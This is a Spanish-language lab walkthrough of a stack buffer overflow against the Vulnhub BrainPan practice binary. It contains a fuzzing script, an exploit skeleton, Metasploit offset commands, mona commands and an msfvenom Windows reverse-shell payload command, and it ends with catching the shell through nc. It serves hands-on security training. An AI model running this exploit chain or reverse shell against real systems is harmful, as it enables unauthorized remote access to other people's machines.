
----------

-------------

 Instalamos la maquina vulnerable de vulnhub BrainPan

En esta  maquina en concreto encontramos un archivo .exe que nos vamos a compartir hacia la maquina windows 10 (que estoy usando en este caso aunque podria ser una maquina windows7 sin problema), y por ese binario vamos a realizar nuestro bufferoverflow.

Nos vamos a añadir el binario en el escritorio en una carpate llamada BOF y segudio a esto vamos a instalarnos el inmunnity dfebburger que es el programa con el que vamos a ir realizando pruebas para realizar el buffer.

Despues de esto tenemos que ir a mona github descargarlo y llevarnos el archivo.py que nos ha creado a /discoC/archivosdeProgramax86/InmunnityINC/pycomasnds/ y pegarlo ahi para que el Inmunnity lo detecte.

Entramos en el Inmunitty y abrimos el binario BrainPan y le damos al boton de play para ejecutarlo y que ahora dentro de nuestra kali lo podamos ver ejecutandose. Tenemos que ver el puerto 9999
![[Pasted image 20240408230955.png]]

Ahora definimos el directorio Bof que habiamos creado al principio como nuestro directorio acutal de trabajo con el siguiente comando desde el inmunnity.
![[Pasted image 20240408231018.png]]

Para realizar fuzzing deberemos de usar el siguiente script en python3, esto es para conocer en que punto crashea el programa, tenemos que intercambiar la ip por la de la maquina windows esto siempre lo tenemos que estar ejecutando cuando desde el inmunitty estemos corriendo nuestro programa
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.1.203"
port = 9999
timeout = 1
prefix = ""
string = prefix + "A" * 100
while True:

    try:

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:

        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

```

El output al ejecutar el programa debe de ser el punto en el que crashea el binario que estamos corriendo en el inmunnity.

![[Pasted image 20240408231045.png]]

Desde el debugger tenemos que ver esto (El EIP, tiene que aparecer de la siguiente manera)
![[Pasted image 20240408231100.png]]

Despues de esto tenemos que obtener el ofsett que es la cantidad de bytes que hay desde el comienzo del buffer hasta donde se ocasiona el desbordamiento. Para ello tenemos que crearnos el siguiente script donde vamos a tener que ir añadiendo parametros lo primero seria la ip y el puerto.
```python
import socket
ip = "192.168.1.203"
port = 9999

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""
buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")


```

Despues tenemos que generar una cantidad de bytes mayor a los 600 en este caso que hemos obtenido en el fuzzing que seria el punto donde crashea para ello usaremos el siguiente modulo de metasploit de la siguiente manera 
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Y nos genera lo siguiente:
![[Pasted image 20240408231129.png]]

Y lo añadimos dentro de la variable payload de exploit.py.

Seguido a esto dentro del debugger tenemos que añadir el siguiente comando de !mona y ejecutalo.
![[Pasted image 20240408231147.png]]

Despues de esto volvemos a la maquina kali y lo que tenemos que hacer es correr el exploit.py con los bites añadidos en el payload y nos tiene que dar un resultado similar a este.
![[Pasted image 20240203215902.png]]

Y en el debugger en este caso en el EIP nos da un numero que nos tenemos que copiar 
![[Pasted image 20240203215956.png]]

Y vamos a añadir al siguiente comando de metasploit 
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q <EIP>
```

Con eysto conseguiremos el ofsett que nos lo devolvera este modulo y nos lo tenemos que copiar y añadirlo al script de python que habiamos creado anteriormente. Y en el apartado de retn añadimos 4 B que queda de esta manera.
![[Pasted image 20240203220506.png]]

Ahora desde kali vamos a instalar badchars con pip install badchars.
Con esto instalado usamos el siguiente comando para obtener los badchars
```bas
badchars -f python
```
El resultado nos lo copiamos y lo sustituimos por el payload anterior de la siguiente forma.
![[Pasted image 20240203221026.png]]

Nos vamos al debugger y con mona ejecutamos un comando para que nos genere los badchars
![[Pasted image 20240203221206.png]]

Despues de esto volvemos a ejecutar el exploit y vemos como el programa crashea de nuevo.
Nos copiamos el siguiente dato y lo pegamos abajo del debugger con un comando
![[Pasted image 20240203221407.png]]

```bash
!mona compare -f C:\Users\zunderrub\Desktop\BOF\bytearray.bin -a 005FF910
```

Cuando lo ejecutemos nos saldran badchars que en esta maquina en concreto no hay pero si lo ubiese deberiamos de irnos a nuestro sploit y eliminar los que fuesen iguales del exploit.

Ahora volvemos al debugger y tenemos que volver a ejecutar lo siguiente.
```bash
!mona jmp -r esp -cpb "\x00"
```

Nos deberia de aparecer lo siguiente
![[Pasted image 20240203222148.png]]

De ahi tenemos que seleccionar el numero que hay arriba de las letras de color rojo

Lo copiamos y lo añadimos pulsando el boton negro que hay en el debugger en el siguiente desplegable.
![[Pasted image 20240203222405.png]]

Al ejecutar esto una de las lineas se habra puesto de color azul y a su izquierda tiene un numero que es otro pinted que nos tenemos que llevar a nuesto kali y sustituir en el exploit por el retn que teniamos antes. Y lo modificamos tal que quede de la siguiente forma.

![[Pasted image 20240203222803.png]]

Y segido a eso ese numero lo invertimos tal que quede de esta manera.
![[Pasted image 20240203223156.png]]

Y el padding debe de quedar asi.
![[Pasted image 20240203223252.png]]

Ahora con msfvenom debemos de generar un shellcode de la siguiente manera.
```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.237 LPORT=443 EXITFUNC=thread -b "\x00" -f c
```

Y todo el resultado de este shelcode lo añadimos en el exploit a la variable payload sustituyendolo por lo anterior borrando el ; final y aparte de todo esto tambien hay que modificar la ip de la maquina windows por la ip ahora ya de nuestra maquina victima final.

Ejecutamos el exploit y de la otr parte nos ponemos en escucha con nc por el puerto que le indicamos en el shellcode. Y al ejecutarlo deberiamos de obtener nuestra reverse shell hacia nuestra maquina victima.

![[Pasted image 20240203224102.png]]